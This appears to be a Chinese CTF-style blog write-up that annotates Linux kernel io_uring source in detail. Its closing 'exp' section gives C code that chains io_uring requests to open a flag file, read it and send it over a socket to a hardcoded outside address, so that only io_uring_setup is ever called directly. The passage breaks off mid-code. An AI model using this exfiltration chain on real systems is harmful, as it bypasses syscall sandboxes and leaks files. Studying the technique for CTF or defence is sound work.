为固定最大值 if (!wq_list_empty(&amp;ctx-&gt;iopoll_list) || to_submit) &#123; // 如果有 iopoll 任务或可提交请求 const struct cred *creds = NULL; if (ctx-&gt;sq_creds != current_cred()) creds = override_creds(ctx-&gt;sq_creds); // 保存和恢复 creds 身份信息避免安全漏洞 mutex_lock(&amp;ctx-&gt;uring_lock); // 上锁保护关键区 if (!wq_list_empty(&amp;ctx-&gt;iopoll_list)) io_do_iopoll(ctx, true); // 处理 iopoll 轮询事件 /* * Don&#x27;t submit if refs are dying, good for io_uring_register(), * but also it is relied upon by io_ring_exit_work() */ if (to_submit &amp;&amp; likely(!percpu_ref_is_dying(&amp;ctx-&gt;refs)) &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED)) ret = io_submit_sqes(ctx, to_submit); // 提交请求到 SQ 环 mutex_unlock(&amp;ctx-&gt;uring_lock); if (to_submit &amp;&amp; wq_has_sleeper(&amp;ctx-&gt;sqo_sq_wait)) wake_up(&amp;ctx-&gt;sqo_sq_wait); // 唤醒 sqo_sq 等待线程 if (creds) revert_creds(creds); &#125; return ret;&#125; 其中 io_sqring_entries 逻辑如下 所以内核在SQPOLL 模式下判断是否有任务需要执行，就是看 tail 是否更新 123456789static inline unsigned int io_sqring_entries(struct io_ring_ctx *ctx)&#123; struct io_rings *rings = ctx-&gt;rings; unsigned int entries; /* make sure SQ entry isn&#x27;t read before tail */ entries = smp_load_acquire(&amp;rings-&gt;sq.tail) - ctx-&gt;cached_sq_head; return min(entries, ctx-&gt;sq_entries);&#125; io_submit_sqes 最后是真正的提交请求函数 计算需要提交的sqes并跟踪状态 12345678910111213int io_submit_sqes(struct io_ring_ctx *ctx, unsigned int nr) __must_hold(&amp;ctx-&gt;uring_lock)&#123; unsigned int entries = io_sqring_entries(ctx); unsigned int left; int ret; if (unlikely(!entries)) return 0; /* make sure SQ entry isn&#x27;t read before tail */ ret = left = min(nr, entries); io_get_task_refs(left); io_submit_state_start(&amp;ctx-&gt;submit_state, left); 循环处理每个sqes 123456789101112131415161718do &#123; const struct io_uring_sqe *sqe; struct io_kiocb *req; if (unlikely(!io_alloc_req(ctx, &amp;req))) break; if (unlikely(!io_get_sqe(ctx, &amp;sqe))) &#123; io_req_add_to_cache(req, ctx); break; &#125; // 为每个SQE分配并初始化io_kiocb请求 if (unlikely(io_submit_sqe(ctx, req, sqe)) &amp;&amp; // 真正的提交 !(ctx-&gt;flags &amp; IORING_SETUP_SUBMIT_ALL)) &#123; left--; break; &#125;&#125; while (--left); io_submit_sqe 这个函数比较关键的是对于同步的处理, 我们知道, io_uring 是异步的, 任务处理的顺序不一定是按照提交的顺序, 但是, 如果 sqe 的 flag字段设置了 IOSQE_IO_LINK , 那么任务就会挂在一条链上, 直到一个任务没有此flag, 而链上的任务的执行是有先后顺序 同时, 要理解, ctx-&gt;sumit_state.link 是一个循环链表, 由 io_kiocb 组成, 每个 io_kiocb 的link成员指向下一个 io_kiocb 结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960static inline int io_submit_sqe(struct io_ring_ctx *ctx, struct io_kiocb *req, const struct io_uring_sqe *sqe) __must_hold(&amp;ctx-&gt;uring_lock)&#123; struct io_submit_link *link = &amp;ctx-&gt;submit_state.link; int ret; ret = io_init_req(ctx, req, sqe); // 初始化并校验SQE请求req if (unlikely(ret)) return io_submit_fail_init(sqe, req, ret); // 如果已有链头或者SQE标记了链接标志 trace_io_uring_submit_req(req); /* * If we already have a head request, queue this one for async * submittal once the head completes. If we don&#x27;t have a head but * IOSQE_IO_LINK is set in the sqe, start a new head. This one will be * submitted sync once the chain is complete. If none of those * conditions are true (normal request), then just queue it. */ if (unlikely(link-&gt;head)) &#123; // 如果链表已经有了一个head 请求, 意味着之前sqe 有 `IOSQE_IO_LINK` 标志 ret = io_req_prep_async(req); // 准备异步提交状态 if (unlikely(ret)) return io_submit_fail_init(sqe, req, ret); trace_io_uring_link(req, link-&gt;head); link-&gt;last-&gt;link = req; link-&gt;last = req; // 将本项挂载到链表 if (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) return 0; // 如果此项没有 LINK 标志, 清空 链表 /* last request of the link, flush it */ req = link-&gt;head; link-&gt;head = NULL; if (req-&gt;flags &amp; (REQ_F_FORCE_ASYNC | REQ_F_FAIL)) goto fallback; &#125; else if (unlikely(req-&gt;flags &amp; (IO_REQ_LINK_FLAGS | REQ_F_FORCE_ASYNC | REQ_F_FAIL))) &#123; // 如果之前的任务没有LINK 标记, 但此任务有, 给链表添加一个头 if (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) &#123; link-&gt;head = req; link-&gt;last = req; &#125; else &#123;fallback: // 加入降级提交fallback队列 io_queue_sqe_fallback(req); &#125; return 0; &#125; // 加入普通提交队列 io_queue_sqe(req); return 0;&#125; io_queue_sqe | io_issue_sqe | 重要 12345678910111213141516static inline void io_queue_sqe(struct io_kiocb *req) __must_hold(&amp;req-&gt;ctx-&gt;uring_lock)&#123; int ret; ret = io_issue_sqe(req, IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER); /* * We async punt it if the file wasn&#x27;t marked NOWAIT, or if the file * doesn&#x27;t support non-blocking read/write attempts */ if (likely(!ret)) io_arm_ltimeout(req); else io_queue_async(req, ret);&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243static int io_issue_sqe(struct io_kiocb *req, unsigned int issue_flags)&#123; const struct io_issue_def *def = &amp;io_issue_defs[req-&gt;opcode]; // 根据op_code 查看请求def const struct cred *creds = NULL; int ret; if (unlikely(!io_assign_file(req, def, issue_flags))) return -EBADF; // 为请求分配文件描述符 if (unlikely((req-&gt;flags &amp; REQ_F_CREDS) &amp;&amp; req-&gt;creds != current_cred())) creds = override_creds(req-&gt;creds); // 备份和恢复请求执行线程的安全凭证 if (!def-&gt;audit_skip) audit_uring_entry(req-&gt;opcode); // 调用audit跟踪提交事件 ret = def-&gt;issue(req, issue_flags); // 调用def-&gt;issue执行请求 if (!def-&gt;audit_skip) audit_uring_exit(!ret, ret); if (creds) revert_creds(creds); // 恢复凭证 if (ret == IOU_OK) &#123; if (issue_flags &amp; IO_URING_F_COMPLETE_DEFER) // 如果成功并且标记了延迟完成,注册延迟完成回调 io_req_complete_defer(req); else io_req_complete_post(req, issue_flags); // 否则直接提交完成 &#125; else if (ret != IOU_ISSUE_SKIP_COMPLETE) return ret; /* If the op doesn&#x27;t have a file, we&#x27;re not polling for it */ if ((req-&gt;ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp; def-&gt;iopoll_queue) io_iopoll_req_issued(req, issue_flags); return 0;&#125; io_get_sqe | 重要 12345678910111213141516171819202122232425static bool io_get_sqe(struct io_ring_ctx *ctx, const struct io_uring_sqe **sqe)&#123; unsigned mask = ctx-&gt;sq_entries - 1; unsigned head = ctx-&gt;cached_sq_head++ &amp; mask; if (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) &#123; head = READ_ONCE(ctx-&gt;sq_array[head]); // 如果没有设置NOSQARRAY 直接从array读 if (unlikely(head &gt;= ctx-&gt;sq_entries)) &#123; // 丢弃无效 entries spin_lock(&amp;ctx-&gt;completion_lock); ctx-&gt;cq_extra--; spin_unlock(&amp;ctx-&gt;completion_lock); WRITE_ONCE(ctx-&gt;rings-&gt;sq_dropped, READ_ONCE(ctx-&gt;rings-&gt;sq_dropped) + 1); return false; &#125; &#125; if (ctx-&gt;flags &amp; IORING_SETUP_SQE128) head &lt;&lt;= 1; *sqe = &amp;ctx-&gt;sq_sqes[head]; // 从 sq_sqes 取一个sqe return true;&#125; io_submit_sqe | 同步与异步的请求执行 我们首先回到 io_submit_sqe 我们注意到, 如果存在 LINK 标记, 只是将这个req添加到链上, 而没有 io_queue_sqe. 如果前一个请求有 LINK 标记, 此时没有, 也只是将请求加入链中后, 清空 head. 此时调用的是 io_queue_sqe(NULL) 综上, 对于link, 并没有直接处理. 12345678910111213141516171819202122232425262728293031323334353637 if (unlikely(link-&gt;head)) &#123; // 如果链表已经有了一个head 请求, 意味着之前sqe 有 `IOSQE_IO_LINK` 标志 ret = io_req_prep_async(req); // 准备异步提交状态 if (unlikely(ret)) return io_submit_fail_init(sqe, req, ret); trace_io_uring_link(req, link-&gt;head); link-&gt;last-&gt;link = req; link-&gt;last = req; // 将本项挂载到链表 if (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) return 0; // 如果此项没有 LINK 标志, 清空 链表 /* last request of the link, flush it */ req = link-&gt;head; link-&gt;head = NULL; if (req-&gt;flags &amp; (REQ_F_FORCE_ASYNC | REQ_F_FAIL)) goto fallback; &#125; else if (unlikely(req-&gt;flags &amp; (IO_REQ_LINK_FLAGS | REQ_F_FORCE_ASYNC | REQ_F_FAIL))) &#123; // 如果之前的任务没有LINK 标记, 但此任务有, 给链表添加一个头 if (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) &#123; link-&gt;head = req; link-&gt;last = req; &#125; else &#123;fallback: // 加入降级提交fallback队列 io_queue_sqe_fallback(req); &#125; return 0; &#125; // 加入普通提交队列 io_queue_sqe(req); 再次重回 io_queue_sqe 函数, 我们发现其在调用 io_issue_sqe 时设置了这样两个标志 IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER, 字面意义上理解, 就是非阻塞与延迟完成. 首先为什么要非阻塞呢? 让我们往前回想, 发现, 在 IOPOLL 模式下, io_uring_enter 也是调用了 io_submit_sqes , 最终也会调用到此函数, 所以如果这个函数阻塞了, IOPOLL模式下, 用户进程实际上也是阻塞的, 也就不符合异步的初衷了 12345678910111213141516static inline void io_queue_sqe(struct io_kiocb *req) __must_hold(&amp;req-&gt;ctx-&gt;uring_lock)&#123; int ret; ret = io_issue_sqe(req, IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER); /* * We async punt it if the file wasn&#x27;t marked NOWAIT, or if the file * doesn&#x27;t support non-blocking read/write attempts */ if (likely(!ret)) io_arm_ltimeout(req); else io_queue_async(req, ret);&#125; 接下来再进入 io_issue_sqe , 其中使用了一个虚表调用处理函数, 并且之前的flag也作为参数传入了. 而我们知道, 如read, write等很多操作, 都是阻塞的, 不能 NOBLOCK , 因此, 这个执行只是一个尝试执行, 实际上并没有真正完成请求 12ret = def-&gt;issue(req, issue_flags);// 调用def-&gt;issue执行请求 接下来我们注意到, 在 io_queue_sqe 调用此函数时, 设置了 IO_URING_F_COMPLETE_DEFER 标志 123456789if (ret == IOU_OK) &#123; if (issue_flags &amp; IO_URING_F_COMPLETE_DEFER) // 如果成功并且标记了延迟完成,注册延迟完成回调 io_req_complete_defer(req); else io_req_complete_post(req, issue_flags); // 否则直接提交完成 &#125; else if (ret != IOU_ISSUE_SKIP_COMPLETE) return ret; 继续进入 io_req_complete_defer 发现实际上就是将请求插入插入链表 123456789static inline void io_req_complete_defer(struct io_kiocb *req) __must_hold(&amp;req-&gt;ctx-&gt;uring_lock)&#123; struct io_submit_state *state = &amp;req-&gt;ctx-&gt;submit_state; lockdep_assert_held(&amp;req-&gt;ctx-&gt;uring_lock); wq_list_add_tail(&amp;req-&gt;comp_list, &amp;state-&gt;compl_reqs);&#125; 这也没有完成请求. 那么真正完成请求是在哪? 让我们继续分析 io_queue_async 在 io_issue_sqe 返回后, io_queue_sqe 继续调用了此函数 1234567891011121314151617181920212223242526272829303132static void io_queue_async(struct io_kiocb *req, int ret) __must_hold(&amp;req-&gt;ctx-&gt;uring_lock)&#123; struct io_kiocb *linked_timeout; if (ret != -EAGAIN || (req-&gt;flags &amp; REQ_F_NOWAIT)) &#123; io_req_defer_failed(req, ret); return; &#125;// 如果请求是不可等待的必须立马完成的, 就不能推迟 linked_timeout = io_prep_linked_timeout(req); switch (io_arm_poll_handler(req, 0)) &#123; // 这里调用了一个 论询问 handler, 确定 请求的类型 case IO_APOLL_READY: // 如果已经可以完成了 io_kbuf_recycle(req, 0); io_req_task_queue(req); break; case IO_APOLL_ABORTED: // 如果终止了 io_kbuf_recycle(req, 0); io_queue_iowq(req, NULL); break; case IO_APOLL_OK: // 如果已经完成了 break; &#125; if (linked_timeout) io_queue_linked_timeout(linked_timeout);&#125; 主要到, 当为 IO_APOLL_ABORTED 时, 调用了 io_queue_iowq 这里先介绍一下 kernel work queue 机制, workqueue 是一个内核线程池, 当有任务来时, 就从线程池中寻找一个线程运行, 这里就是将请求放入线程池的队列中 这里可能会有读者有疑问, 那线程池是什么时候创建的呢? 其实是在被笔者跳过的 ctx 的创建过程中// #TODO 由于过于繁杂, 笔者暂时没有分析 io_queue_iowq | 任务处理线程池 这一部分也比较重要, 首先是 io_prep_async_link(req) , 为在一条链上的请求创建 work 结构, 用来放入队列中, 并且 通过 io_wq_enqueue 将其加入线程池队列 1234567891011121314151617181920212223242526void io_queue_iowq(struct io_kiocb *req, struct io_tw_state *ts_dont_use)&#123; struct io_kiocb *link = io_prep_linked_timeout(req); struct io_uring_task *tctx = req-&gt;task-&gt;io_uring; BUG_ON(!tctx); BUG_ON(!tctx-&gt;io_wq); /* init -&gt;work of the whole link before punting */ io_prep_async_link(req); // 为链少的每一个 req 准备work结构 /* * Not expected to happen, but if we do have a bug where this _can_ * happen, catch it here and ensure the request is marked as * canceled. That will make io-wq go through the usual work cancel * procedure rather than attempt to run this request (or create a new * worker for it). */ if (WARN_ON_ONCE(!same_thread_group(req-&gt;task, current))) req-&gt;work.flags |= IO_WQ_WORK_CANCEL; trace_io_uring_queue_async_work(req, io_wq_is_hashed(&amp;req-&gt;work)); io_wq_enqueue(tctx-&gt;io_wq, &amp;req-&gt;work); if (link) io_queue_linked_timeout(link);&#125; 为什么要用work结构而不是 io_kiocb 结构呢, work结构是 io_kiocb 的一个成员, 通过指针减去偏移就可以得到 io_kiocb 的指针, 与此通过, 由于work结构更小, 创建临时结构体时占用空间更小 io_wq_enqueue io_wq_enqueue 是将任务加入 io_wq 线程池的任务队列中. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950void io_wq_enqueue(struct io_wq *wq, struct io_wq_work *work)&#123; struct io_wq_acct *acct = io_work_get_acct(wq, work); struct io_cb_cancel_data match; unsigned work_flags = work-&gt;flags; bool do_create; /* * If io-wq is exiting for this task, or if the request has explicitly * been marked as one that should not get executed, cancel it here. */ if (test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state) || (work-&gt;flags &amp; IO_WQ_WORK_CANCEL)) &#123; io_run_cancel(work, wq); return; &#125; // 如果需要取消 work raw_spin_lock(&amp;acct-&gt;lock); io_wq_insert_work(wq, work); clear_bit(IO_ACCT_STALLED_BIT, &amp;acct-&gt;flags); raw_spin_unlock(&amp;acct-&gt;lock); rcu_read_lock(); do_create = !io_wq_activate_free_worker(wq, acct); rcu_read_unlock(); // 是否需要创建worker if (do_create &amp;&amp; ((work_flags &amp; IO_WQ_WORK_CONCURRENT) || !atomic_read(&amp;acct-&gt;nr_running))) &#123; bool did_create; did_create = io_wq_create_worker(wq, acct); // 创建worker if (likely(did_create)) return; // 如果已经创建了, 直接返回 raw_spin_lock(&amp;wq-&gt;lock); if (acct-&gt;nr_workers) &#123; raw_spin_unlock(&amp;wq-&gt;lock); return; &#125; raw_spin_unlock(&amp;wq-&gt;lock); /* fatal condition, failed to create the first worker */ match.fn = io_wq_work_match_item, match.data = work, match.cancel_all = false, io_acct_cancel_pending_work(wq, acct, &amp;match); &#125;&#125; 实际上调用了 io_wq_create_worker 1234567891011121314151617181920static bool io_wq_create_worker(struct io_wq *wq, struct io_wq_acct *acct)&#123; if (unlikely(!acct-&gt;max_workers)) pr_warn_once(&quot;io-wq is not configured for unbound workers&quot;); raw_spin_lock(&amp;wq-&gt;lock); if (acct-&gt;nr_workers &gt;= acct-&gt;max_workers) &#123; raw_spin_unlock(&amp;wq-&gt;lock); return true; &#125; // 如果已经有上限个 worker了 // 直接返回 acct-&gt;nr_workers++; raw_spin_unlock(&amp;wq-&gt;lock); atomic_inc(&amp;acct-&gt;nr_running); atomic_inc(&amp;wq-&gt;worker_refs); return create_io_worker(wq, acct-&gt;index); // 创建一个新worker&#125; create_io_worker | worker处理线程的创建 12345678910111213141516171819202122232425262728293031323334353637383940414243static bool create_io_worker(struct io_wq *wq, int index)&#123; struct io_wq_acct *acct = &amp;wq-&gt;acct[index]; struct io_worker *worker; struct task_struct *tsk; __set_current_state(TASK_RUNNING); worker = kzalloc(sizeof(*worker), GFP_KERNEL); // 为work分配了空间 if (!worker) &#123;fail: atomic_dec(&amp;acct-&gt;nr_running); raw_spin_lock(&amp;wq-&gt;lock); acct-&gt;nr_workers--; raw_spin_unlock(&amp;wq-&gt;lock); io_worker_ref_put(wq); return false; &#125; refcount_set(&amp;worker-&gt;ref, 1); worker-&gt;wq = wq; raw_spin_lock_init(&amp;worker-&gt;lock); init_completion(&amp;worker-&gt;ref_done); if (index == IO_WQ_ACCT_BOUND) worker-&gt;flags |= IO_WORKER_F_BOUND; tsk = create_io_thread(io_wq_worker, worker, NUMA_NO_NODE); // 创建处理线程 if (!IS_ERR(tsk)) &#123; io_init_new_worker(wq, worker, tsk); &#125; else if (!io_should_retry_thread(PTR_ERR(tsk))) &#123; kfree(worker); goto fail; &#125; else &#123; INIT_WORK(&amp;worker-&gt;work, io_workqueue_create); schedule_work(&amp;worker-&gt;work); &#125; return true;&#125; io_wq_worker | 内核任务线程 此线程就是线程池中worker的基本单元, 也是真正的异步io处理线程, 其通过自旋锁来阻塞进程, 直到有 work 需要完成. 中间一大段是和线程调度相关的代码, 包括设置信号处理之类的代码, 由于并不是当前分析的重点, 这里笔者就先跳过了. 最终, 是调用了 io_worker_handle_work 来处理任务 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162static int io_wq_worker(void *data)&#123; struct io_worker *worker = data; struct io_wq_acct *acct = io_wq_get_acct(worker); struct io_wq *wq = worker-&gt;wq; bool exit_mask = false, last_timeout = false; char buf[TASK_COMM_LEN]; worker-&gt;flags |= (IO_WORKER_F_UP | IO_WORKER_F_RUNNING); snprintf(buf, sizeof(buf), &quot;iou-wrk-%d&quot;, wq-&gt;task-&gt;pid); set_task_comm(current, buf); while (!test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state)) &#123; long ret; set_current_state(TASK_INTERRUPTIBLE); while (io_acct_run_queue(acct)) io_worker_handle_work(acct, worker); // 轮询 // 如果存在需要完成的work // io_acct_run_queue 就能持有 acct-&gt;lock 返回 raw_spin_lock(&amp;wq-&gt;lock); /* * Last sleep timed out. Exit if we&#x27;re not the last worker, * or if someone modified our affinity. */ if (last_timeout &amp;&amp; (exit_mask || acct-&gt;nr_workers &gt; 1)) &#123; acct-&gt;nr_workers--; raw_spin_unlock(&amp;wq-&gt;lock); __set_current_state(TASK_RUNNING); break; &#125; last_timeout = false; __io_worker_idle(wq, worker); // raw_spin_unlock(&amp;wq-&gt;lock); if (io_run_task_work()) continue; ret = schedule_timeout(WORKER_IDLE_TIMEOUT); if (signal_pending(current)) &#123; struct ksignal ksig; if (!get_signal(&amp;ksig)) continue; break; &#125; if (!ret) &#123; last_timeout = true; exit_mask = !cpumask_test_cpu(raw_smp_processor_id(), wq-&gt;cpu_mask); &#125; &#125; if (test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state) &amp;&amp; io_acct_run_queue(acct)) io_worker_handle_work(acct, worker); // worker handle 必须持有 acct-&gt;lock io_worker_exit(worker); return 0;&#125; io_worker_handle_work 这个函数必须持有 acct-&gt;lock 才能进入, 也是此函数真正开始处理任务 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980static void io_worker_handle_work(struct io_wq_acct *acct, struct io_worker *worker) __releases(&amp;acct-&gt;lock)&#123; struct io_wq *wq = worker-&gt;wq; bool do_kill = test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state); do &#123; struct io_wq_work *work; /* * If we got some work, mark us as busy. If we didn&#x27;t, but * the list isn&#x27;t empty, it means we stalled on hashed work. * Mark us stalled so we don&#x27;t keep looking for work when we * can&#x27;t make progress, any work completion or insertion will * clear the stalled flag. */ work = io_get_next_work(acct, worker); raw_spin_unlock(&amp;acct-&gt;lock); if (work) &#123; __io_worker_busy(wq, worker); /* * Make sure cancelation can find this, even before * it becomes the active work. That avoids a window * where the work has been removed from our general * work list, but isn&#x27;t yet discoverable as the * current work item for this worker. */ raw_spin_lock(&amp;worker-&gt;lock); worker-&gt;next_work = work; raw_spin_unlock(&amp;worker-&gt;lock); &#125; else &#123; break; &#125; io_assign_current_work(worker, work); __set_current_state(TASK_RUNNING); // 处理所有链起来的任务 do &#123; struct io_wq_work *next_hashed, *linked; unsigned int hash = io_get_work_hash(work); next_hashed = wq_next_work(work); // 获取下一个任务 if (unlikely(do_kill) &amp;&amp; (work-&gt;flags &amp; IO_WQ_WORK_UNBOUND)) work-&gt;flags |= IO_WQ_WORK_CANCEL; wq-&gt;do_work(work); // do_work 来处理任务 io_assign_current_work(worker, NULL); linked = wq-&gt;free_work(work); // 断链 work = next_hashed; // 将work改为下一个任务 if (!work &amp;&amp; linked &amp;&amp; !io_wq_is_hashed(linked)) &#123; work = linked; linked = NULL; &#125; io_assign_current_work(worker, work); if (linked) io_wq_enqueue(wq, linked); if (hash != -1U &amp;&amp; !next_hashed) &#123; /* serialize hash clear with wake_up() */ spin_lock_irq(&amp;wq-&gt;hash-&gt;wait.lock); clear_bit(hash, &amp;wq-&gt;hash-&gt;map); clear_bit(IO_ACCT_STALLED_BIT, &amp;acct-&gt;flags); spin_unlock_irq(&amp;wq-&gt;hash-&gt;wait.lock); if (wq_has_sleeper(&amp;wq-&gt;hash-&gt;wait)) wake_up(&amp;wq-&gt;hash-&gt;wait); &#125; &#125; while (work); // 不断循环执行, 直到链上清空 if (!__io_acct_run_queue(acct)) break; raw_spin_lock(&amp;acct-&gt;lock); &#125; while (1);&#125; 注意到这里调用了 do_work 来处理任务, do_work 实际指向的是 io_wq_submit_work, 最终还是调用了 io_issue_queue 来处理任务 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677void io_wq_submit_work(struct io_wq_work *work)&#123; struct io_kiocb *req = container_of(work, struct io_kiocb, work); // 通过 work 结构体 直接根据偏移计算拿到 req 的指针 const struct io_issue_def *def = &amp;io_issue_defs[req-&gt;opcode]; unsigned int issue_flags = IO_URING_F_UNLOCKED | IO_URING_F_IOWQ; bool needs_poll = false; int ret = 0, err = -ECANCELED; /* one will be dropped by -&gt;io_wq_free_work() after returning to io-wq */ if (!(req-&gt;flags &amp; REQ_F_REFCOUNT)) __io_req_set_refcount(req, 2); else req_ref_get(req); io_arm_ltimeout(req); /* either cancelled or io-wq is dying, so don&#x27;t touch tctx-&gt;iowq */ if (work-&gt;flags &amp; IO_WQ_WORK_CANCEL) &#123;fail: io_req_task_queue_fail(req, err); return; &#125; if (!io_assign_file(req, def, issue_flags)) &#123; err = -EBADF; work-&gt;flags |= IO_WQ_WORK_CANCEL; goto fail; &#125; if (req-&gt;flags &amp; REQ_F_FORCE_ASYNC) &#123; bool opcode_poll = def-&gt;pollin || def-&gt;pollout; if (opcode_poll &amp;&amp; file_can_poll(req-&gt;file)) &#123; needs_poll = true; issue_flags |= IO_URING_F_NONBLOCK; &#125; &#125; do &#123; ret = io_issue_sqe(req, issue_flags); // 最终还是调用了 io_issue_sqe 来处理任务 if (ret != -EAGAIN) break; /* * If REQ_F_NOWAIT is set, then don&#x27;t wait or retry with * poll. -EAGAIN is final for that case. */ if (req-&gt;flags &amp; REQ_F_NOWAIT) break; /* * We can get EAGAIN for iopolled IO even though we&#x27;re * forcing a sync submission from here, since we can&#x27;t * wait for request slots on the block side. */ if (!needs_poll) &#123; if (!(req-&gt;ctx-&gt;flags &amp; IORING_SETUP_IOPOLL)) break; if (io_wq_worker_stopped()) break; cond_resched(); continue; &#125; if (io_arm_poll_handler(req, issue_flags) == IO_APOLL_OK) return; /* aborted or ready, in either case retry blocking */ needs_poll = false; issue_flags &amp;= ~IO_URING_F_NONBLOCK; &#125; while (1); /* avoid locking problems by failing it from a clean context */ if (ret &lt; 0) io_req_task_queue_fail(req, ret);&#125; summary 笔者已经从上至下，透视了整个io_uring的实现// 当然，在这篇文章，笔者还留下了很多问题，比如linux kernel与同步和异步过程相关的实现， 由于笔者太菜了，对于kernel部分代码的分析也稍显吃力。 不过就这篇文章而言，在用户态io_uring的使用，笔者应该讲述得很清晰了。 最后，再让我们回到文章开始的问题： 如何只用一个 io_uring_setup 实现ORW? 在完全看完整篇文章后，大家应该也有答案了： 设置 IORING_SETUP_SQPOLL 此时不再需要 io_uring_submite 提交 设置 IORING_SETUP_NOMMAP 此时不再需要之后mmap ring和sqe TODO ctx 初始化分析 线程调度分析 wq队列处理分析 exp 笔者在实际利用时发现, 在笔者的笔记本的qemu的环境里, 似乎是因为只有一个core, 如果控制权转移给了io_sq_thread 线程, 除非其主动转移控制权, 主进程基本会直接阻塞, 因此, open sq的处理实际要在 io_uring_setup 创建返回fd之前, 因此 flag文件的fd为3 才能稳定应用 通过Socket连接写回： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758int main()&#123; struct io_uring_params params = &#123;0&#125;; char flag[0x10] = &quot;./flag\\x00&quot;; char buff[0x10] = &quot;AAAAAAAA\\n&quot;; void *ring_ptr; unsigned *ktail; struct &#123; __u64 a1; __u64 a2; &#125; socket_add = //&#123;0x0100007f5c110002, 0&#125;; &#123;0x017aa8c05c110002,0&#125;; // mmap(0xC0D3000uLL, 0x3000uLL, 7uLL, 34u, 0xFFFFFFFFuLL, 0LL); params.sq_off.user_addr = 0xC0D3000 + 0x1000; ring_ptr = params.cq_off.user_addr = 0xC0D3000 + 0x2000; params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY; params.sq_thread_idle = 0x2000000; struct io_uring_sqe *sqe = (struct io_uring_sqe *)(0xC0D3000 + 0x1000); sqe[0].opcode = IORING_OP_OPENAT; sqe[0].flags = IOSQE_IO_LINK; sqe[0].fd = -100; sqe[0].addr = flag; sqe[1].opcode = IORING_OP_READ; sqe[1].flags = IOSQE_IO_LINK; sqe[1].fd = 3; sqe[1].addr = buff; sqe[1].len = 0x100; sqe[2].opcode = IORING_OP_SOCKET; sqe[2].flags = IOSQE_IO_LINK; sqe[2].fd = 2; sqe[2].off = 1; sqe[3].opcode = IORING_OP_CONNECT; sqe[3].flags = IOSQE_IO_LINK; sqe[3].fd = 5; sqe[3].flags = 4; sqe[3].addr = &amp;socket_add; sqe[3].off = 0x10; sqe[4].opcode = IORING_OP_WRITE; sqe[4].fd = 5; sqe[4].addr = buff; sqe[4].len = 0x100; ktail = ring_ptr + 4; io_uring_smp_store_release(ktail, 5); __do_syscall2(425, 0x10, &amp;params); while (1) &#123;&#125;; return 0;&#125; orw 123456789101112131415161718sqe[0].opcode = IORING_OP_OPENAT;sqe[0].flags = IOSQE_IO_HARDLINK;sqe[0].fd = -100;sqe[0].addr = flag;sqe[1].opcode = IORING_OP_READ;sqe[1].flags = IOSQE_IO_HARDLINK;sqe[1].fd = 3;sqe[1].addr = buff;sqe[1].len = 0x10;//sqe[4].flags = IOSQE_IO_HARDLINK;sqe[2].opcode = IORING_OP_WRITE;sqe[2].fd = 1;sqe[2].addr = buff;sqe[2].len = 0x10; 通过大量open避免 open的fd和 io_uring_setup 返回的fd竞争的问题 增强利用稳定性 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647sqe[0].opcode = IORING_OP_OPENAT;sqe[0].flags = IOSQE_IO_HARDLINK;sqe[0].fd = -100;sqe[0].addr = flag;sqe[1].opcode = IORING_OP_OPENAT;sqe[1].flags = IOSQE_IO_HARDLINK;sqe[1].fd = -100;sqe[1].addr = flag;sqe[2].opcode = IORING_OP_OPENAT;sqe[2].flags = IOSQE_IO_HARDLINK;sqe[2].fd = -100;sqe[2].addr = flag;sqe[3].opcode = IORING_OP_OPENAT;sqe[3].flags = IOSQE_IO_HARDLINK;sqe[3].fd = -100;sqe[3].addr = flag;sqe[4].opcode = IORING_OP_OPENAT;sqe[4].flags = IOSQE_IO_HARDLINK;sqe[4].fd = -100;sqe[4].addr = flag;sqe[5].opcode = IORING_OP_READ;sqe[5].flags = IOSQE_IO_HARDLINK;sqe[5].fd = 6;sqe[5].addr = buff;sqe[5].len = 0x100;sqe[6].opcode = IORING_OP_SOCKET;sqe[6].flags = IOSQE_IO_HARDLINK;sqe[6].fd = 2;sqe[6].off = 1;sqe[7].opcode = IORING_OP_CONNECT;sqe[7].flags = IOSQE_IO_HARDLINK;sqe[7].fd = 9;sqe[7].flags = 4;sqe[7].addr = &amp;socket_add;sqe[7].off = 0x10;sqe[8].opcode = IORING_OP_WRITE;sqe[8].fd = 9;sqe[8].addr = buff;sqe[8].len = 0x100; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758int main()&#123; struct io_uring_params params = &#123;0&#125;; char flag[0x10] = &quot;./flag\\x00&quot;; char buff[0x10] = &quot;AAAAAAAA\\n&quot;; void *ring_ptr; unsigned *ktail; struct &#123; __u64 a1; __u64 a2; &#125; socket_add = //&#123;0x0100007f5c110002, 0&#125;; &#123;0x017aa8c05c110002,0&#125;; //mmap(0xC0D3000uLL, 0x3000uLL, 7uLL, 34u, 0xFFFFFFFFuLL, 0LL); params.sq_off.user_addr = 0xC0D3000 + 0x1000; ring_ptr = params.cq_off.user_addr = 0xC0D3000 + 0x2000; params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY; params.sq_thread_idle = 0x2000000; struct io_uring_sqe *sqe = (struct io_uring_sqe *)(0xC0D3000 + 